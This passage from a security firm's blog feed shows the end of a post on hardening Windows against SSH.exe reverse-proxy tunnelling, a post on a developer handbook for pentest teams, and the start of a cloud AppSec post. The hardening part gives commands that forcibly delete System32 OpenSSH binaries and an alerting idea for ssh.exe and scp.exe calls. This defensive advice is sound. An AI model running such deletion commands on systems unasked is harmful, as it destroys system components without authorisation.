&lt;h2&gt;How to secure this?&lt;span class=&#34;absolute -mt-20&#34; id=&#34;how-to-secure-this&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#how-to-secure-this&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Removing the SSH client:&lt;/strong&gt; It is recommended to remove the builtin SSH client for non-technical staff. It can be done by first removing the SSH client with Settings’ &amp;gt; ‘Apps’ &amp;gt; ‘Optional Features’ &amp;gt; Search for “OpenSSH” and hit Uninstall then reboot. It however is still in System32. Uninstalling the SSH client from the endpoint is not yet complete after this, as described in the PTP blog post. To further remove the binaries:&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;takeown /F C:\Windows\System32\OpenSSH /R /D Y
icacls C:\Windows\System32\OpenSSH /grant administrators:F /T
rmdir /s C:\Windows\System32\OpenSSH&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Secure the corporate firewall settings:&lt;/strong&gt; Even if the SSH client is no longer present in the endpoint, the attacker could still move a LOLBin version (signed by Microsoft) onto the user endpoint, or operate from an internal Linux /Mac machine for example. The first order of business is of course blocking outbound TCP connections on port 22 if it is not needed. I’m no firewall expert but for firewalls that support application level operations, SSL stripping with protocol inspection should be performed on ports not meant for SSH (443 and so on) and block connections where the protocols are not matched. There are probably no good recommendations from me for clients who need to allowlist Microsoft ASN IP or Azure subdomains for SSH access unfortunately. If the reader has good ideas on this by all means let me know!&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Monitor for the user endpoints for the SSH binary being called:&lt;/strong&gt; For non-technical staff, the SSH &amp;amp; SCP binaries have little reason to be called at all. A custom alert could be written fire off when SSH.exe or SCP.exe is called (optionally, with filehash matching as well).&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;In summary, SSH.exe has been bundled with Windows 10, 11 &amp;amp; Windows Server since late 2017 and signed by Microsoft. The reverse dynamic proxy is very powerful and there are a number of tricks that can be used to punch through corporate firewalls to get a reliable tunnel for offensive tooling to compromise entire AD domains. Defenders are recommended to watch for invocation of this binary on endpoints used by non-technical users, or uninstall the feature entirely.&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>How to Handle Development Projects in a Pentest Company</title>
      <link>//localhost:1313/articles/2024/08/2024-08-06-how-to-handle-development-projects-in-a-pentest-company/</link>
      <pubDate>Tue, 06 Aug 2024 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2024/08/2024-08-06-how-to-handle-development-projects-in-a-pentest-company/</guid>
      <description>
        
        
        &lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/stallions.gif&#34; title=&#34;stallions&#34; alt=&#34;stallions&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;stallions&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;If you are a pentester you probably never really think about programming. Instead you are testing what others have developed. However, every now and then a quick python or bash script is needed to exploit some stuff you have found, or automate a certain process you are using. &lt;/p&gt;
&lt;p&gt;Things become interesting when you are in a penetration testing company that has many strong penetration testers and everyone writes these scripts. Clearly each script solves a particular problem, either for the tester or the team. So how do we ensure, that:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;No time is wasted on writing the same scripts others have already written&lt;/li&gt;
&lt;li&gt;We keep the knowledge available when team members leave the business&lt;/li&gt;
&lt;li&gt;Ensure that any code is understandable for everyone&lt;/li&gt;
&lt;li&gt;Ensure that the knowledge in regards to the script is preserved for others to use.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The more scripts that are written, the more knowledge goes into code. Code needs maintenance. Suddenly we find ourselves in the same situation as any other software development company. With a difference though, the life expectancy for a script is often just for a single project that lasts up to one month. Meaning, the code goes into hibernation, people forget about it or someone might remember it eight months later on another project. What you might end up with is an unmaintained self hosted gitlab instance with 200 projects, that no one knows anything about. What makes it even more chaotic is the usage of different languages that testers are comfortable with. Some might have a stronger background in Ruby, some really like using Golang. Others might write Typescript instead of Javascript. Don’t forget about Rust, all the C languages and maybe even some good old PHP. &lt;/p&gt;
&lt;p&gt;I want to share my knowledge about these issues and how we tackle them at JUMPSEC. We are fortunate enough to have a dedicated development team given we work on larger projects, such as our proprietary solution that is the backbone to our Continuous Attack Surface Management service. &lt;/p&gt;
&lt;h1&gt;Understanding the basics&lt;/h1&gt;&lt;p&gt;Before we tackle anything, we must understand the root cause for any problem. You might want to skip this section and jump straight into the solution areas below as this is non technical and very dry. &lt;/p&gt;
&lt;p&gt;At the very top, we should understand how important development is and understand the differences and challenges a penetration testing company has. &lt;/p&gt;
&lt;p&gt;In general, a developer gets paid to work on a product that solves a problem for a customer. They do not get paid to write code, as plenty of juniors might think. A penetration tester is getting paid to write a report that outlines the security issues a client has. In the background a developer must write code to make their product usable, while a security expert chooses to make use of programming to help with a certain problem (but might never need to). &lt;/p&gt;
&lt;p&gt;If we look at this from a very high level, it should be clear that a developer has much more experience handling code, compared to a general security researcher, simply due to the time they spend on programming. There are of course exceptions, where you have a team member that moved from development to cyber security in their professional career. But remember, you are only as strong as the weakest link. &lt;/p&gt;
&lt;p&gt;Which brings us directly to the &lt;em&gt;people problem&lt;/em&gt;. It is already difficult to find new employees for a penetration testing company. The pool of experts is small and there is a worldwide shortage. Why would one make the pool even smaller, by requiring from a potential candidate that they know 10 different programming languages that might be used within the business? &lt;/p&gt;
&lt;p&gt;This brings us to some very important and specific requirements for our solution: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;We must define what programming languages are used amongst the team&lt;/li&gt;
&lt;li&gt;Our solution cannot prohibit us from reducing the number of candidates &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Lets focus on the level of expertise and what we do with the weakest link and the most experienced developer on our pentest team. &lt;/p&gt;
&lt;p&gt;Generally, from my experience, penetration testers are not shy to play around with technology and are not afraid to break things. It is kinda part of the job description. So setting up a new environment for a project, like a C2 infrastructure is not really scarce. &lt;/p&gt;
&lt;p&gt;However, the approach between a developer, possibly with fullstack and devops experience, will differ from that of a security researcher. &lt;/p&gt;
&lt;p&gt;I believe in the year 2024 it is basic knowledge to set up stuff with docker and docker compose. However, I also think that it is not common to know your way around k8s, minicube and helm. Let alone I would never expect a pentester to be able to setup a full infrastructure as code project with Terraform, Ansible and Azure. Most certainly, not in an ad hoc situation for an adversarial simulation or similar pentest project. &lt;/p&gt;
&lt;p&gt;What if some members of the team are able to do that though? Well, the moment you start deploying projects in a very professional manner with lots of experience behind it, it becomes only manageable by the people that have that experience and exposure to the project. In other words, if your person leaves the business you start to have an unknown skeleton on your infrastructure, in some cases people might not even be able to login because of missing SSH keys. &lt;/p&gt;
&lt;p&gt;This brings us to the requirements:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Technology used must be easy to learn and should not require lots of specialised expertise&lt;/li&gt;
&lt;li&gt;Must have the resources to onboard new team members quickly&lt;/li&gt;
&lt;li&gt;The goal must be that everyone in the business is able to jump on the maintenance call and get stuff solved&lt;/li&gt;
&lt;li&gt;Do not become dependent on a single person in the business&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;The solution&lt;/h1&gt;&lt;p&gt;As we know from security and specifically ISO 27001 certifications, it&amp;rsquo;s all fine and great to have documents everywhere, but unless it really becomes the culture of the business, documents are useless. &lt;/p&gt;
&lt;p&gt;Unfortunately, we won’t be able to make it a culture without a document that clearly defines some processes and gives guidance to new members quickly. &lt;/p&gt;
&lt;p&gt;Quite frankly, a very well written document can speed up many different areas. &lt;/p&gt;
&lt;p&gt;Let’s call this document The Developer Handbook. &lt;/p&gt;
&lt;p&gt;If you have a look around the internet you will find many guides on how to write one. I would like to share with you our, real &amp;amp; currently in use, developer handbook. Furthermore, I will go into some details of some sections going forward. &lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s look into the sections that I believe are required for a successful document.&lt;/p&gt;
&lt;h2&gt;Format &amp;amp; Location&lt;span class=&#34;absolute -mt-20&#34; id=&#34;format--location&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#format--location&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Documentation for development projects quickly gets outdated, let&amp;rsquo;s start by hosting it on Github and writing it in markdown, so any IDE / text editor can handle it. &lt;/p&gt;
&lt;p&gt;Versioning is also taken care of by working with git. After all, everyone that does coding should be familiar with some version control system. &lt;/p&gt;
&lt;p&gt;We will use pandoc to convert the markdown to a PDF version, and in fact an HTML version as well. &lt;/p&gt;
&lt;h2&gt;Section 1 - Introduction&lt;span class=&#34;absolute -mt-20&#34; id=&#34;section-1---introduction&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#section-1---introduction&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;This section should cover the purpose of the document. Making it clear why people should read it and what the overall expectations are (both for the document and the users).&lt;/p&gt;
&lt;h2&gt;Section 2- Code of Conduct&lt;span class=&#34;absolute -mt-20&#34; id=&#34;section-2--code-of-conduct&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#section-2--code-of-conduct&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;As we are often building tools that make you think “what if this gets into the wrong hands”, we should remind ourselves why we do it. At the end of the day we are professional researchers that focus on security related subjects. The tools we write are there to make software behave in unintended ways, exploit vulnerabilities or make our life easier. &lt;/p&gt;
&lt;h2&gt;Section 3 - Defining Programming Languages&lt;span class=&#34;absolute -mt-20&#34; id=&#34;section-3---defining-programming-languages&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#section-3---defining-programming-languages&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;In this section we should emphasise on our ability and set some limits. Sure it&amp;rsquo;s fun to explore new programming languages as a technical person. Frink, Rebol and Forth languages might look interesting during a weekend, but how many other people in the team could help out with those code bases? How quickly can issues be resolved by falling back to Stackoverflow and Google? Just because AI can help you with it, doesn’t mean it makes sense to use it in a business context. Keep those things to personal projects and find a common language everyone feels comfortable with. Usually that is: bash scripting, Python, sometimes Golang and lately more and more people are getting into Rust. &lt;/p&gt;
&lt;h2&gt;Section 4 - Code Styles&lt;span class=&#34;absolute -mt-20&#34; id=&#34;section-4---code-styles&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#section-4---code-styles&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;This one is probably the most overlooked subject of all. However, it is incredibly useful &amp;amp; helpful to define a coding style for the entire team. It helps a lot, when everyone follows the same code style and no one needs to “adjust their way of reading”. &lt;/p&gt;
&lt;h2&gt;Section 5 - Editors&lt;span class=&#34;absolute -mt-20&#34; id=&#34;section-5---editors&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#section-5---editors&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Isn’t everyone on Sublime these days? Ah no, Atom looked so much nicer. What about Netbeans, PHPStorm, Eclipse (eh), vim, nano.  Well, and then there is VSCode. &lt;/p&gt;
&lt;p&gt;At the end of the day it doesn’t really matter which editor you use to write code in. What is more important is the set of features it can provide you to save time by automating tasks, such as formatting code to your set coding style. &lt;/p&gt;
&lt;p&gt;We went with VSCode. It is available in various “editions”, what matters for us is the extension ecosystem. We make heavy use of mypy, formatting and automated docstrings. solved within the editor and not just via pre-commit.&lt;/p&gt;
&lt;p&gt;If you are using VSCode, this would also be a good place to have specific configurations shared, including default configurations for developer containers.&lt;/p&gt;
&lt;h2&gt;Section 6 - Version Control&lt;span class=&#34;absolute -mt-20&#34; id=&#34;section-6---version-control&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#section-6---version-control&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;First of all you want to specify what version control system you want to use. Whether it is git or svn. However, it is more important that this section can help as a “tutorial” on some processes. Sure you would expect everyone to know “git clone”, “git pull”, “git add” and “git commit”. But how about merging? Is this something you expect every consultant to know? What about the language of git? Staging &amp;amp; Stashing are probably the easiest ones. However, never assume that everyone is on the same page as you are. Specifically with development, things can go wrong or be done in many different ways. How do we delete files from the git history again so we don’t expose some secrets? Should we squash and if so when? How to do things and when to do them, without going over the entire git manual is probably a good starting point for this section.&lt;/p&gt;
&lt;h2&gt;Section 7 - Project Setup&lt;span class=&#34;absolute -mt-20&#34; id=&#34;section-7---project-setup&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#section-7---project-setup&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;The project setup section should cover a few things such as how a project should be structured both in terms of files, how dependencies are managed, what type of files are required. Best practices for public Github repositories, and generally how a project should be managed. &lt;/p&gt;
&lt;p&gt;Given that we are in a git environment, why not create an example project folder as well? &lt;/p&gt;
&lt;h2&gt;Section 8 - Testing&lt;span class=&#34;absolute -mt-20&#34; id=&#34;section-8---testing&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#section-8---testing&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;There are many types of tests that can be written for any software project. Most likely performance tests are not the most important ones for pentesting software. However, this section should give some guidelines on what is expected and what testing suite should be used. &lt;/p&gt;
&lt;p&gt;It can also explain how to set up testing in a new project. How to use setUp and tearDown methods. &lt;/p&gt;
&lt;h2&gt;Section 9 - CI &amp;amp; CD&lt;span class=&#34;absolute -mt-20&#34; id=&#34;section-9---ci--cd&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#section-9---ci--cd&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Not every project needs a CI/CD process, however, whenever there is one it is imperative that certain actions are being executed. The section should talk about some limits in terms of resources to the company (not everyone has Github Enterprise with thousands of hours of worker times). Which workers should be used, what the authentication process looks like and how images need to be tagged.&lt;/p&gt;
&lt;h2&gt;Section 10 - Documentation&lt;span class=&#34;absolute -mt-20&#34; id=&#34;section-10---documentation&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#section-10---documentation&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;We are entering the inception phase with this one. Writing documentation and guidelines on how to document projects. However, it is a very important subject, as documentation often gets outdated very quickly. &lt;/p&gt;
&lt;p&gt;There are some solutions, such as self explaining code, building documentation automatically based on docstrings, comments etc. Rather than writing a handbook for each project, the time should be spent on the quality of the project. There might be a specific process that is involved to create documentation files automatically within the CI/CD as new versions are published. &lt;/p&gt;
&lt;h2&gt;Section 11 - Security&lt;span class=&#34;absolute -mt-20&#34; id=&#34;section-11---security&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#section-11---security&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Every programming language has some pitfalls. Specifically junior developers might fall for them. An obvious one might be the concatenation of strings rather than using f-strings. There are however many more and often some sort of approach or “library” should be established by developers within your company. Often code is reused, copy &amp;amp; pasted into new projects and simply adjusted. How do we check for security issues? What static code analysers should be used? Are there any requirements in the configuration of these? &lt;/p&gt;
&lt;h2&gt;Section 12 - Performance&lt;span class=&#34;absolute -mt-20&#34; id=&#34;section-12---performance&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#section-12---performance&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;The performance section is quite an interesting one. Here, it is really up to you how deep you want to go  and how important performance considerations are. They certainly do matter, however, given that as a pentesting company your tools/products don’t serve 100 million end users it makes sense to show some approaches that might be better than introducing more advanced concepts such as multithreaded, multi core, async operations. Of course there are exceptions for certain tools. I suggest not to limit the section to pure technology based performance patterns, but also talk about general performance improvements within coding projects, such as best practices for code maintainability, documentation, dependencies, refactoring and so on.&lt;/p&gt;
&lt;h2&gt;Section 13 - Accessibility&lt;span class=&#34;absolute -mt-20&#34; id=&#34;section-13---accessibility&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#section-13---accessibility&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;We kept this section very short. We do not support any accessibility. All tools must be in English, no translations needed. Nor special support for operation systems, screen readers etc. Our tools are not for “real end users”, they are for the tech community and our team. &lt;/p&gt;
&lt;p&gt;However, if you do publish something that goes out to clients or end users, it might make sense to think about this section in more depth. &lt;/p&gt;
&lt;h2&gt;Section 99 - Learning Resources&lt;span class=&#34;absolute -mt-20&#34; id=&#34;section-99---learning-resources&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#section-99---learning-resources&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;This is probably the most important section for new team members, junior team members and anyone that is starting on a project. The handbook should provide some valuable links and collections to tutorials and courses that the team can use to understand certain subjects. There is no harm to also link to your own blog posts. &lt;/p&gt;
&lt;h1&gt;Give me a real example&lt;/h1&gt;&lt;p&gt;Now that you have an idea of what sections there should be in a handbook, have a look at ours:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/JumpsecLabs/Developer.Handbook&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/JumpsecLabs/Developer.Handbook&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;Final Words&lt;/h1&gt;&lt;p&gt;A developer handbook is a constantly evolving document. The main purpose is to give guidance and contribute to the quality of development related work within a company. It should be adjusted every now and then, and it should never be considered a “finished product”. &lt;/p&gt;
&lt;p&gt;You will need to put the effort in yourself to create something that works for you and your team. This depends completely on the expertise of your team and what is important to your projects. There should be discussions with the team and every team member should be able to make changes to the document (remember section 99).&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h1&gt;Bonus Section&lt;/h1&gt;&lt;h2&gt;Github automation&lt;span class=&#34;absolute -mt-20&#34; id=&#34;github-automation&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#github-automation&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;To give you a bit of technology in this blog post I figured it is best to quickly go over Github actions so that you can automatically generate the latest PDF version of the markdown files which you can then share with your team or store them somewhere for your ISO audit. &lt;/p&gt;
&lt;p&gt;We are using [pandoc](&lt;a href=&#34;https://pandoc.org/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://pandoc.org/&lt;/a&gt;) to automatically merge the different sections to a PDF. However, we cannot directly make it a PDF, we first must make a final HTML version. &lt;/p&gt;
&lt;p&gt;You can go over each step by reviewing the file: &lt;a href=&#34;https://github.com/JumpsecLabs/Developer.Handbook/blob/main/.github/workflows/build-pdf.yml&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/JumpsecLabs/Developer.Handbook/blob/main/.github/workflows/build-pdf.yml&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;There are two jobs involved: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Building the final PDF version&lt;/li&gt;
&lt;li&gt;Releasing it under the release tab on Github&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Building a PDF&lt;span class=&#34;absolute -mt-20&#34; id=&#34;building-a-pdf&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#building-a-pdf&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;We cannot directly go from markdown to PDF with pandoc. Hence we must create an HTML version first. &lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;pandoc -t html --include-before-body=./version.md -s -o developer_handbook.html --toc --number-sections --wrap=none $(cat pandoc_order.txt)&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;p&gt;This command takes all the files and in the same order as specified in the pandoc_order.txt file and converts them into a single standalone html file. &lt;/p&gt;
&lt;p&gt;Mind you, for the HTML version, we also have a css.md file, that allows us to make some nice colouring changes. &lt;/p&gt;
&lt;p&gt;Once we have the HTML version we run the converter to PDF&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;pandoc developer_handbook.html -s --pdf-engine=pdflatex -o developer_handbook.pdf -t pdf -f html&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;p&gt;Have a look at the step “Install pandoc” in case you have issues here.&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;    - name: Install pandoc
      run: |
        sudo apt-get install texlive-latex-base texlive-latex-extra texlive-fonts-recommended pandoc -y&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;We are running this workflow on a base Ubuntu image and therefore need to install the latex package required for the pdf-engine. There are other engines as well, but we had some issues that pandoc did not find. In addition to the base installation some extras are necessary and for good measure we also put the fonts package in there. &lt;/p&gt;
&lt;p&gt;There is an texlive-fonts-extra package for fonts, however that increases the running time for the installing step immensely. &lt;/p&gt;
&lt;p&gt;There is an alternative way of doing this, and it is also documented on the official pandoc website: &lt;a href=&#34;https://pandoc.org/installing.html#github-actions&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://pandoc.org/installing.html#github-actions&lt;/a&gt; &lt;/p&gt;
&lt;h3&gt;Releasing the PDF&lt;span class=&#34;absolute -mt-20&#34; id=&#34;releasing-the-pdf&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#releasing-the-pdf&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;We keep the approach very simple. We have a version.md file which we can update at our own will and bump the version manually. &lt;/p&gt;
&lt;p&gt;If you look closely at the “Extract Version” step in the release job you can see we extract it and later use it to tag our release upload on Github.&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;- name: Extract version
      id: extract_version
      run: |
        version=$(grep -oP &amp;#39;Version: \K[0-9]&amp;#43;\.[0-9]&amp;#43;\.[0-9]&amp;#43;&amp;#39; docs/version.md)
        echo &amp;#34;::set-output name=version::$version&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;h2&gt;Useful VSCode extensions&lt;span class=&#34;absolute -mt-20&#34; id=&#34;useful-vscode-extensions&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#useful-vscode-extensions&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;There are only two VSCode extensions I would recommend for this specific project type. &lt;/p&gt;
&lt;h3&gt;Markdown All in One &lt;span class=&#34;absolute -mt-20&#34; id=&#34;markdown-all-in-one&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#markdown-all-in-one&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;This one should be a no-brainer to everyone. However, did you know it can generate a table of contents for you? Open the command palette and run the command “&lt;strong&gt;Create Table of Contents”.&lt;/strong&gt; &lt;/p&gt;
&lt;h3&gt;Markdown as PDF&lt;span class=&#34;absolute -mt-20&#34; id=&#34;markdown-as-pdf&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#markdown-as-pdf&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;This one is a nice one if you want to create a quick PDF out of an MD file.&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>How Cloud Migration is Affecting AppSec - A Red Teamer&#39;s Perspective</title>
      <link>//localhost:1313/articles/2024/07/2024-07-04-how-cloud-migration-is-affecting-appsec-a-red-teamers-perspective/</link>
      <pubDate>Thu, 04 Jul 2024 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2024/07/2024-07-04-how-cloud-migration-is-affecting-appsec-a-red-teamers-perspective/</guid>
      <description>
        
        
        &lt;h2&gt;&lt;strong&gt;Introduction&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;introduction&#34;&gt;&lt;/span&gt;
